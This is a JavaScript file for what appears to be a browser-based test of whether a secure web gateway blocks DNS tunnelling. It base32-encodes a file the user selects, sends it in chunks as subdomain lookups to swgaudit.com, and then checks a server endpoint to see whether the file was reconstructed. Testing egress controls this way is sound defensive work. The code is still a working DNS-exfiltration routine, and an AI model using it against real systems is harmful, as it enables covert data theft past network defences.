const dnsTunnelAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
const dnsTunnelMaxFileSize = 100 * 1024;
const dnsTunnelDomainSuffix = ".swgaudit.com";

const dnsTunnelBase32Encode = (bytes) => {
  let output = "";
  let value = 0;
  let bits = 0;

  bytes.forEach((byte) => {
    value = (value << 8) | byte;
    bits += 8;

    while (bits >= 5) {
      output += dnsTunnelAlphabet[(value >>> (bits - 5)) & 31];
      bits -= 5;
    }
  });

  if (bits > 0) {
    output += dnsTunnelAlphabet[(value << (5 - bits)) & 31];
  }

  return output;
};

const dnsTunnelRandomId = () => {
  const bytes = new Uint8Array(8);
  window.crypto.getRandomValues(bytes);
  return Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("");
};

const dnsTunnelReadFile = (file) => new Promise((resolve, reject) => {
  const reader = new FileReader();
  reader.addEventListener("load", () => resolve(reader.result));
  reader.addEventListener("error", () => reject(reader.error));
  reader.readAsArrayBuffer(file);
});

const dnsTunnelWait = (ms) => new Promise((resolve) => window.setTimeout(resolve, ms));

const dnsTunnelBuildChunks = (id, file, encodedData) => {
  const maxDomainLength = 253;
  const chunkLabelLimit = 60;
  const maxDataLength = maxDomainLength - id.length - dnsTunnelDomainSuffix.length - 5;
  const chunks = [];

  for (let offset = 0, chunkNumber = 1; offset < encodedData.length; chunkNumber++) {
    const labels = [];
    let remainingLength = maxDataLength;

    while (offset < encodedData.length && remainingLength > 0) {
      const labelLength = Math.min(chunkLabelLimit, remainingLength, encodedData.length - offset);
      labels.push(encodedData.slice(offset, offset + labelLength));
      remainingLength -= labelLength + 1;
      offset += labelLength;
    }

    chunks.push({ number: chunkNumber, labels });
  }

  const metadata = {
    name: file.name,
    type: file.type,
    size: file.size,
    totalDataChunks: chunks.length,
    encodedLength: encodedData.length,
  };
  const metadataBytes = new TextEncoder().encode(JSON.stringify(metadata));
  const metadataLabels = dnsTunnelBase32Encode(metadataBytes).match(/.{1,60}/g) || [];

  return [{ number: 0, labels: metadataLabels }, ...chunks];
};

const dnsTunnelCheckResult = async (id, status, attempts = 5, delayMs = 2000) => {
  let lastResult = null;

  for (let attempt = 1; attempt <= attempts; attempt++) {
    status.textContent = `Checking server result (${attempt}/${attempts})...`;

    const response = await fetch(`/data-theft/fetch_uploaded_data.php?id=${encodeURIComponent(id)}`, {
      headers: { "Accept": "application/json" },
    });
    const result = await response.json();
    lastResult = result;

    if (result.success && result.fileUrl) {
      return result;
    }

    if (attempt < attempts) {
      await dnsTunnelWait(delayMs);
    }
  }

  return lastResult || { success: false, message: "No complete file could be reconstructed from the received DNS chunks." };
};

document.querySelectorAll("[data-dns-tunnel-form]").forEach((form) => {
  const fileInput = form.querySelector("[data-dns-tunnel-file]");
  const submitButton = form.querySelector("[data-dns-tunnel-submit]");
  const detail = form.closest(".test-card-detail");
  const status = detail ? detail.querySelector("[data-dns-tunnel-status]") : null;
  const resetButton = detail ? detail.querySelector("[data-dns-tunnel-reset]") : null;

  if (!fileInput || !submitButton || !status) return;

  const setStatus = (message, state) => {
    status.hidden = false;
    status.classList.remove("is-pass", "is-fail");
    if (state) status.classList.add(state);
    status.textContent = message;
  };

  form.addEventListener("submit", async (event) => {
    event.preventDefault();

    const file = fileInput.files[0];
    if (!file) {
      setStatus("Choose a file before running the test.");
      return;
    }

    if (file.size > dnsTunnelMaxFileSize) {
      setStatus("Choose a file smaller than 100 KB.");
      return;
    }

    submitButton.disabled = true;
    if (resetButton) resetButton.hidden = true;

    try {
      setStatus("Preparing DNS tunnelling test...");
      const id = dnsTunnelRandomId();
      const fileBytes = new Uint8Array(await dnsTunnelReadFile(file));
      const encodedData = dnsTunnelBase32Encode(fileBytes);
      const chunks = dnsTunnelBuildChunks(id, file, encodedData);
      let attempted = 0;

      await Promise.all(chunks.map(async (chunk) => {
        const url = `https://${id}.${chunk.number}.${chunk.labels.join(".")}${dnsTunnelDomainSuffix}`;

        try {
          await fetch(url, { mode: "no-cors" });
        } catch (error) {
          // A blocked request is a valid test outcome; the final log check decides pass/fail.
        } finally {
          attempted += 1;
          status.textContent = `Running DNS tunnelling test: ${attempted}/${chunks.length} requests attempted...`;
        }
      }));

      const result = await dnsTunnelCheckResult(id, status);

      if (result.success && result.fileUrl) {
        status.classList.remove("is-pass");
        status.classList.add("is-fail");
        status.innerHTML = `Test Failed: the full file reached the server and was reconstructed. <a href="${result.fileUrl}" target="_blank" rel="noopener">Open reconstructed file</a>`;
      } else {
        status.classList.remove("is-fail");
        status.classList.add("is-pass");
        status.textContent = result.message || "Pass: the full file did not reach the server.";
      }
    } catch (error) {
      setStatus("Test could not complete. Please retry.");
    } finally {
      submitButton.disabled = false;
      if (resetButton) resetButton.hidden = false;
    }
  });

  if (resetButton) {
    resetButton.addEventListener("click", () => {
      form.reset();
      status.hidden = true;
      status.textContent = "";
      status.classList.remove("is-pass", "is-fail");
      resetButton.hidden = true;
    });
  }
});
